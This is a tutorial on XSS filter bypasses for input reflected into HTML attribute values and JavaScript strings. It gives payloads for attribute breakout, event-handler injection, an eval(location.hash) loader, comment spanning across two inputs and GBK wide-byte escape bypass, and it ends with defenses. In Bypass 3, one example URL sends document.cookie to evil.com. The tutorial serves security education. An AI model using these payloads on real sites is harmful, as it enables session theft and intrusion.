# 10 - XSS: Bypassing Filters in Input Value Context

## The Context

A common server-side pattern reflects user input into an `<input>` tag's `value` attribute:

```html
<input type="text" value="$var" />
```

If `$var` is not properly sanitized, the attacker can break out of the attribute and inject arbitrary HTML or JavaScript. The specific bypass technique depends on what the server filters or truncates.

## Bypass 1: Basic Tag Injection

Input:

```
"><script>alert(/xss/)</script>
```

Result:

```html
<input type=text value=""><script>alert(/xss/)</script>" />
```

The `">` closes the `value` attribute and the `<input>` tag. The `<script>` tag then executes in the page context. This is the simplest breakout — it works when there's no filtering at all.

## Bypass 2: Truncation Bypass via Event Handler

If the server truncates `$var` to a fixed length, a `<script>` tag might get cut off:

```
$var outputs as: "><script> alert(/xss
```

The script tag is incomplete and won't execute. Instead, use a shorter payload — an event handler:

Input:

```
" onclick=alert(1)//
```

Result:

```html
<input type=text value="" onclick=alert(1)//" />
```

The `"` closes the `value` attribute, `onclick` is injected as a new attribute, and `//` comments out the trailing quote. Clicking the input fires the alert. This payload is much shorter than a full `<script>` tag, making it effective against length limits.

## Bypass 3: `eval(location.hash)` for Unlimited Payload

When the input length is severely restricted, you can keep the injected attribute minimal and put the real payload in the URL fragment:

Input:

```
" onclick="eval(location.hash.substr(1))
```

Result:

```html
<input type="text" value="" onclick="eval(location.hash.substr(1))" />
```

The attacker's URL:

```
http://www.a.com/test.html#alert(1)
```

`location.hash` returns `#alert(1)`, `.substr(1)` strips the `#`, and `eval()` executes `alert(1)`. The actual payload lives in the URL fragment — which is never sent to the server, so server-side filters and WAFs never see it. The injected code in `value` is just a fixed-length loader.

This can carry arbitrarily complex payloads:

```
http://www.a.com/test.html#document.location='http://evil.com/?c='+document.cookie
```

## Bypass 4: HTML Comment Injection Across Multiple Inputs

When the page has two `<input>` fields that both reflect user input, and each field is individually truncated or filtered, you can use HTML comments to span across them:

Page structure:

```html
<input id=1 type="text" value="$var1" />
xxxxxxxxxxxxx
<input id=2 type="text" value="$var2" />
```

Inputs:

```
$var1: "><! --
$var2: --><script>alert(/xss/);</script>
```

Result:

```html
<input id=1 type="text" value=""><! --" />
xxxxxxxxxxxxxxxxx
<input id=2 type="text" value="--><script>alert(/xss/);</script>" />
```

The `<!-- ... -->` comment swallows everything between the two injection points — the closing tag of input 1, the text between the inputs, and the opening of input 2. The `<script>` tag after `-->` executes normally.

This technique is powerful because:
- Each individual input might be too short for a full payload
- The content between the inputs (which might break parsing) is commented out
- Server-side validation sees two harmless-looking values separately

## Bypass 5: JavaScript String Context — Quote Injection

When user input is reflected inside a JavaScript string:

```html
<script>
var redirectUrl = "$var";
</script>
```

Input:

```
"; alert(/XSS/); "
```

Result:

```html
<script>
var redirectUrl = ""; alert(/XSS/); "";
</script>
```

The first `"` closes the string, `;` ends the statement, `alert(/XSS/)` executes, and `; "` keeps the syntax valid so the parser doesn't choke.

## Bypass 6: Wide-Byte Encoding (`%c1"`)

Some applications use GBK or other multi-byte character encodings. If the server escapes `"` to `\"` but the page uses a multi-byte charset:

Input:

```
%c1"; alert(/XSS/); //
```

The byte `%c1` (0xC1) combines with the backslash `\` (0x5C) to form a valid two-byte GBK character. The escape is consumed, and the `"` closes the string:

```
[0xC1][0x5C] → valid GBK character (eats the backslash)
" → now unescaped, closes the string
```

Result: the `\"` escape is neutralized, and the injected code executes. This only works when:
- The page uses a multi-byte encoding (GBK, Shift_JIS, etc.)
- The server escapes quotes by prepending `\` rather than HTML-encoding them

## Techniques Summary

| Technique | When to Use |
|---|---|
| `"><script>` | No filtering at all |
| `" onclick=alert(1)//` | Length truncation blocks `<script>` tags |
| `" onclick="eval(location.hash.substr(1))` | Severe length limits; payload goes in URL fragment |
| `"><!-- ... --><script>` | Two injection points on the same page |
| `"; alert(); "` | Input reflected inside a JS string |
| `%c1"; alert(); //` | Multi-byte charset + backslash escaping |

## Defenses

- Output encoding by context — HTML-encode inside attributes (`"` → `&quot;`), JS-encode inside scripts (`"` → `\"` or `\u0022`)
- Use allowlist validation — reject characters like `"`, `<`, `>` when they're not expected
- Set `charset=utf-8` explicitly in the Content-Type header to prevent multi-byte encoding attacks
- Content Security Policy — `script-src 'self'` blocks inline event handlers and `eval()`
- Avoid reflecting user input into HTML at all — use DOM APIs (`textContent`, `setAttribute`) instead
